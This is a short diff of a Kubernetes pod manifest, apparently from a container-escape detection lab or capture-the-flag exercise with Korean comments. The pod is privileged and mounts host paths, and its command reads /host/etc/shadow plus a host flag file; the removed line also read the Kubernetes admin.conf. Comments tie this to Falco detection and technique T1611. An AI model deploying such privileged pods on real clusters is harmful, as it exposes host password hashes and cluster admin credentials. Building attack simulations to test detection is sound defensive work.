@@ -37,7 +37,8 @@ spec:
         - sh
         - -c
         # 호스트 민감파일을 읽어 stdout(=파드 로그)으로. Falco 가 /host/etc read 를 포착(T1611).
-        - "cat /host/etc/shadow /host/etc/kubernetes/admin.conf 2>/dev/null; echo ESCAPE_DONE; sleep 3600"
+        # /host/etc/shopflow/host.flag = Wave1 호스트 objective(크라운 주얼) — 읽으면 획득(값대조).
+        - "cat /host/etc/shopflow/host.flag /host/etc/shadow 2>/dev/null; echo ESCAPE_DONE; sleep 3600"
       securityContext:
         privileged: true                          # ← PodSecurity enforce=baseline 이 거부하는 핵심 필드
       volumeMounts:
